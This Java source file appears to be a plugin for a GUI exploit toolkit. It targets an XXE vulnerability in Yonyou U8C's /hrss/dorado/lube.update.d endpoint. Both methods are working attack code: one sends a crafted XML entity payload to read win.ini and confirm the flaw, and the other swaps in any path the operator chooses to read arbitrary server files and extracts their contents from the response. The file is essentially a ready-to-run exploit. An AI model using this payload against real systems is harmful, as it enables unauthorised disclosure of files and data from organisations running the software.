package exp.oa.yongyou.u8c;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_U8C_lube_update_XXE implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try{
            String payload = "__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY test  SYSTEM \"file:///c:/windows/win.ini\" >]><rpc transaction=\"10\" method=\"resetPwd\"><def><dataset type=\"Custom\" id=\"dsResetPwd\"><f name=\"user\"></f></dataset></def><data><rs dataset=\"dsResetPwd\"><r id=\"10008\" state=\"insert\"><n><v>1</v></n></r></rs></data><vps><p name=\"__profileKeys\">%26test;</p></vps></rpc>&1404976068948";
            Response response = HttpTools.post(url + "/hrss/dorado/lube.update.d?__rpc=true&__rpcAgent=true",payload, new HashMap<String, String>(), "utf-8");
            if (response.getCode() ==200 &&  response.getText().contains("[fonts]")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_U8C_lube_update_XXE ]");
                    textArea.appendText("\n 存在/hrss/dorado/lube.update.d接口");
                });
                Platform.runLater(() -> {
                    textArea.appendText("\n 该漏洞可用于文件读取eg : c:/windows/win.ini");
                });
                return true;
            } else {
                Platform.runLater(() -> textArea.appendText("\n"));

                return false;
            }
        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        try{


            String payload = "__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY test  SYSTEM \"file:///"+cmd+"\" >]><rpc transaction=\"10\" method=\"resetPwd\"><def><dataset type=\"Custom\" id=\"dsResetPwd\"><f name=\"user\"></f></dataset></def><data><rs dataset=\"dsResetPwd\"><r id=\"10008\" state=\"insert\"><n><v>1</v></n></r></rs></data><vps><p name=\"__profileKeys\">%26test;</p></vps></rpc>&1404976068948";
            HashMap<String, String> head = new HashMap<>();
            Response post_res = HttpTools.post(url+"/hrss/dorado/lube.update.d?__rpc=true&__rpcAgent=true",payload,head,"utf-8");
            if (post_res.getText().contains("__profileKeys") && post_res.getCode()==200) {
                String pre = "<viewProperties><p name=\"__profileKeys\" value=\";";
                String var = post_res.getText().substring(post_res.getText().indexOf(pre)+pre.length(),post_res.getText().indexOf("\" dataType=\"0\" /></viewProperties>\n"));
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行成功,请自行判断");
                    textArea_cmd.appendText("\n"+ var);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行失败！");
                });
                return false;
            }
        }catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });

        }
        return false;
    }
}
